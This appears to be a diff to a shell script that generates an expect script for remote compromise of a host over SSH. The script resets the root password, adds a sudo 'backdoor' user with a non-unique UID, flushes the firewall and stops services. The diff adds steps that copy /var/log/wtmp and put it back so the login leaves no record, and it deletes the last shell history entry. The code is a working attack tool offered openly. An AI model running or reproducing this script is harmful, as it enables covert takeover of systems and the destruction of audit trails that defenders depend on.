@@ -15,6 +15,7 @@ serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd
 newUser="sysd"
 newRootPass="Password!"
 newPass="Password!"
+alterLastHistory="yes"
 port=22
 
 if [ $# -gt 0 ]; then
@@ -41,10 +42,33 @@ else
 fi
 
 #switch to sh instead of bash or whatever default is
+echo "#!/usr/bin/expect" > $expectFile #write shebang to file
 
-/bin/cat <<HEAD > $expectFile
-#!/usr/bin/expect
-spawn ssh $firstArg
+if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
+	/bin/cat <<SCP >> $expectFile
+spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
+expect {
+-re ".*Are.*.*yes.*no.*" {
+send "yes\n"
+exp_continue
+}
+expect "*assword*"
+send "$pass\r"
+sleep 1
+spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
+expect {
+-re ".*Are.*.*yes.*no.*" {
+send "yes\n"
+exp_continue
+}
+expect "*assword*"
+send "$pass\r"
+sleep 1
+SCP
+fi
+
+/bin/cat <<HEAD >> $expectFile
+spawn ssh -p $port $firstArg
 expect {
 -re ".*Are.*.*yes.*no.*" {
 send "yes\n"
@@ -70,7 +94,7 @@ fi
 interact -o -nobuffer -re \$prompt return
 send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
 interact -o -nobuffer -re \$prompt return
-send "useradd -g root -G sudo $newUser" #add 'backdoor' user
+send "useradd -g root -G sudo -o -u 250 $newUser" #add 'backdoor' user
 interact -o -nobuffer -re \$prompt return
 send "/usr/bin/env iptables -F || ipfw flush \r"
 MORE
@@ -87,9 +111,16 @@ for service in $serviceStop; do
 	echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
 done
 
+if [ "$alterLastHistory" == "yes" ]; then
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\" #replace the wtmp file to cover our tracks" >> $expectFile
+fi
+
 /bin/cat <<BOTTOM >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "history -d \`history | wc -l\`; exit\r"
+send "exit\r" #exit the sh and go back to original shell
+interact -o -nobuffer -re \$prompt return
+send "history -d \`history | wc -l\`; exit\r" #exit ssh
 interact
 BOTTOM
 
